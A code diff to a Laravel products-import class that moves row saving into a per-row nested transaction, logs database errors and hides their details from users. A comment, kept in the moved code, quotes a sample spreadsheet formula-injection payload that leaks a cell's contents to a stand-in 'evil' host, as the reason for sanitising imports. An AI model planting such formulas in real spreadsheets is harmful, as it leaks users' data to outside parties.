@@ -14,9 +14,11 @@ use App\Services\ProductLocationStockService;
 use App\Services\ProductService;
 use App\Support\ProductCurrencyColumns;
 use App\Support\SpreadsheetSafety;
+use Illuminate\Database\QueryException;
 use Illuminate\Support\Arr;
 use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Validator;
 use Maatwebsite\Excel\Concerns\SkipsFailures;
 use Maatwebsite\Excel\Concerns\SkipsOnFailure;
@@ -195,113 +197,141 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
                 }
                 $this->seenSkus[$sku] = true;
 
-                // Find or create category
-                $categoryId = null;
-                if (! empty($row['category'])) {
-                    $category = ProductCategory::firstOrCreate(
-                        [
-                            'name' => $row['category'],
-                            'organization_id' => $this->organizationId,
-                        ]
-                    );
-                    $categoryId = $category->id;
-                }
-
-                // Find or create location. Generate a unique 3-char-derived
-                // code so importing "Toronto Main" and later "Toronto Backup"
-                // doesn't produce two locations sharing code='TOR'.
-                $locationId = null;
-                if (! empty($row['location'])) {
-                    $location = ProductLocation::firstOrCreate(
-                        [
-                            'name' => $row['location'],
-                            'organization_id' => $this->organizationId,
-                        ],
-                        [
-                            'code' => $this->uniqueLocationCode($row['location']),
-                        ]
-                    );
-                    $locationId = $location->id;
-                }
-
-                // Check if product exists (by SKU) — include soft-deleted rows:
-                // the SKU unique index counts them, so a plain lookup would miss
-                // a trashed product and then collide on create. Restore + update
-                // instead.
-                $product = Product::withTrashed()
-                    ->where('sku', $row['sku'])
-                    ->where('organization_id', $this->organizationId)
-                    ->first();
-
-                // Convert status string to is_active boolean
-                $status = $row['status'] ?? 'active';
-                $isActive = strtolower($status) === 'active';
-
-                // Strip leading formula triggers from imported strings so
-                // a tenant-uploaded row that says
-                //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
-                // doesn't land in the DB and re-export to a downloader
-                // whose spreadsheet viewer evaluates it.
-                $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);
-
-                $productData = [
-                    'name' => $sanitise($row['name']),
-                    'sku' => $sanitise($row['sku']),
-                    'barcode' => $sanitise($row['barcode'] ?? null),
-                    'description' => $sanitise($row['description'] ?? null),
-                    'category_id' => $categoryId,
-                    'location_id' => $locationId,
-                    'price' => $row['price'],
-                    'currency' => $row['currency'] ?? 'USD',
-                    'purchase_price' => $row['purchase_price'] ?? null,
-                    'stock' => $row['stock'],
-                    'min_stock' => $row['min_stock'] ?? 0,
-                    'is_active' => $isActive,
-                    'notes' => $sanitise($row['notes'] ?? null),
-                    'organization_id' => $this->organizationId,
-                ];
-
-                if ($currencyColumns !== []) {
-                    $productData['price_in_currencies'] = $this->mergeCurrencyPrices(
-                        $product?->price_in_currencies,
-                        $row,
-                        $currencyColumns,
-                    );
-                }
-
-                if ($product) {
-                    // Update existing product, restoring it first if it was
-                    // soft-deleted so re-importing a deleted SKU brings it back.
-                    if ($product->trashed()) {
-                        $product->restore();
-                    }
-                    // The sheet's stock is booked as a ledgered recount
-                    // (locked, audited, binned), never written to the row.
-                    $product->update(Arr::except($productData, ['stock']));
-                    $this->bookImportedStock($product, (int) $row['stock']);
-                    $this->updated++;
-                } else {
-                    // Create new product; its stock is an opening ledger row.
-                    $product = DB::transaction(function () use ($productData) {
-                        $created = Product::create($productData);
-                        app(ProductService::class)->recordOpeningStock($created, $this->actor);
-
-                        return $created;
-                    });
-                    $this->imported++;
-                }
-
-                $this->applyPrimarySupplier($product, $row, $rowNumber);
+                // Everything this row writes runs in its own (nested)
+                // transaction. Laravel Excel wraps each chunk in a
+                // transaction; on PostgreSQL one failed statement would abort
+                // it, failing every later row and rolling back the earlier
+                // ones at commit. Rolling back just this row's savepoint keeps
+                // the rest of the file importing.
+                $created = DB::transaction(fn () => $this->saveRow($row, $rowNumber, $currencyColumns));
+                $created ? $this->imported++ : $this->updated++;
             } catch (\Exception $e) {
                 $this->errors[] = [
                     'row' => $rowNumber,
-                    'errors' => [$e->getMessage()],
+                    'errors' => [$e instanceof QueryException ? 'The row could not be saved due to a database error.' : $e->getMessage()],
                 ];
+
+                if ($e instanceof QueryException) {
+                    Log::error('Product import row failed with database error', [
+                        'organization_id' => $this->organizationId,
+                        'row' => $rowNumber,
+                        'error' => $e->getMessage(),
+                    ]);
+                }
             }
         }
 
         // Advance the absolute-row offset for the next chunk.
         $this->rowOffset += $rows->count();
+    }
+
+    /**
+     * Create or update one validated row's product (with its category,
+     * location and supplier link).
+     *
+     * @param  Collection<string, mixed>  $row
+     * @param  array<string, string>  $currencyColumns
+     * @return bool true when a product was created, false when one was updated
+     */
+    private function saveRow(Collection $row, int $rowNumber, array $currencyColumns): bool
+    {
+        // Find or create category
+        $categoryId = null;
+        if (! empty($row['category'])) {
+            $category = ProductCategory::firstOrCreate(
+                [
+                    'name' => $row['category'],
+                    'organization_id' => $this->organizationId,
+                ]
+            );
+            $categoryId = $category->id;
+        }
+
+        // Find or create location. Generate a unique 3-char-derived
+        // code so importing "Toronto Main" and later "Toronto Backup"
+        // doesn't produce two locations sharing code='TOR'.
+        $locationId = null;
+        if (! empty($row['location'])) {
+            $location = ProductLocation::firstOrCreate(
+                [
+                    'name' => $row['location'],
+                    'organization_id' => $this->organizationId,
+                ],
+                [
+                    'code' => $this->uniqueLocationCode($row['location']),
+                ]
+            );
+            $locationId = $location->id;
+        }
+
+        // Check if product exists (by SKU) — include soft-deleted rows:
+        // the SKU unique index counts them, so a plain lookup would miss
+        // a trashed product and then collide on create. Restore + update
+        // instead.
+        $product = Product::withTrashed()
+            ->where('sku', $row['sku'])
+            ->where('organization_id', $this->organizationId)
+            ->first();
+
+        // Convert status string to is_active boolean
+        $status = $row['status'] ?? 'active';
+        $isActive = strtolower($status) === 'active';
+
+        // Strip leading formula triggers from imported strings so
+        // a tenant-uploaded row that says
+        //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
+        // doesn't land in the DB and re-export to a downloader
+        // whose spreadsheet viewer evaluates it.
+        $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);
+
+        $productData = [
+            'name' => $sanitise($row['name']),
+            'sku' => $sanitise($row['sku']),
+            'barcode' => $sanitise($row['barcode'] ?? null),
+            'description' => $sanitise($row['description'] ?? null),
+            'category_id' => $categoryId,
+            'location_id' => $locationId,
+            'price' => $row['price'],
+            // Blank keeps an existing product's currency; a new product gets
+            // the organization's (Product::booted).
+            'currency' => $row['currency'] ?? $product?->currency,
+            'purchase_price' => $row['purchase_price'] ?? null,
+            'stock' => $row['stock'],
+            'min_stock' => $row['min_stock'] ?? 0,
+            'is_active' => $isActive,
+            'notes' => $sanitise($row['notes'] ?? null),
+            'organization_id' => $this->organizationId,
+        ];
+
+        if ($currencyColumns !== []) {
+            $productData['price_in_currencies'] = $this->mergeCurrencyPrices(
+                $product?->price_in_currencies,
+                $row,
+                $currencyColumns,
+            );
+        }
+
+        if ($product) {
+            // Update existing product, restoring it first if it was
+            // soft-deleted so re-importing a deleted SKU brings it back.
+            if ($product->trashed()) {
+                $product->restore();
+            }
+            // The sheet's stock is booked as a ledgered recount
+            // (locked, audited, binned), never written to the row.
+            $product->update(Arr::except($productData, ['stock']));
+            $this->bookImportedStock($product, (int) $row['stock']);
+            $created = false;
+        } else {
+            // Create new product; its stock is an opening ledger row.
+            $product = Product::create($productData);
+            app(ProductService::class)->recordOpeningStock($product, $this->actor);
+            $created = true;
+        }
+
+        $this->applyPrimarySupplier($product, $row, $rowNumber);
+
+        return $created;
     }
 
     /**
